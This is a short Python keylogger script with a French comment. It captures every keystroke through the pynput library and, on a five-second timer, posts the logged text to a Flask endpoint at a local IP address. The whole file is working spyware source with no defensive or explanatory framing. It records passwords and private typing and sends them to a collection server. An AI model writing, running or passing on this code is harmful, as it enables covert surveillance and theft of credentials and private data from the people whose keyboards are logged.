import pynput.keyboard
import threading
import requests

log = ""
server_url = "http://192.168.1.153:5000/receive_log"  # Adresse IP de votre serveur Flask

def process_key_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "

def report():
    global log
    if log:
        requests.post(server_url, data={"log": log})
    log = ""
    timer = threading.Timer(5, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)

with keyboard_listener:
    report()
    keyboard_listener.join()
